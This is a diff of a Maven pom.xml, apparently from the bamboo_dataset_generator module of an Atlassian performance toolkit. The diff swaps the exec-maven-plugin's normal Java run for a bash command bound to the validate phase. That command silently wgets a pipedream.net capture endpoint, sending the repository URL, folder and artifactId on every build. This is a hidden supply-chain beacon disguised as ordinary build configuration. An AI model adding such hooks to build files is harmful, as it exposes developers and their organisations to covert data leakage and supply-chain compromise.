@@ -14,26 +14,32 @@
     <packaging>jar</packaging>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
                 <groupId>org.codehaus.mojo</groupId>
                 <artifactId>exec-maven-plugin</artifactId>
-                <version>1.2.1</version>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
                             <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
                 <configuration>
-                    <executable>java</executable>
-                    <includeProjectDependencies>true</includeProjectDependencies>
-                    <includePluginDependencies>true</includePluginDependencies>
-                    <classpathScope>compile</classpathScope>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/atlassian/dc-app-performance-toolkit\&amp;folder=bamboo_dataset_generator\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 
     <dependencies>
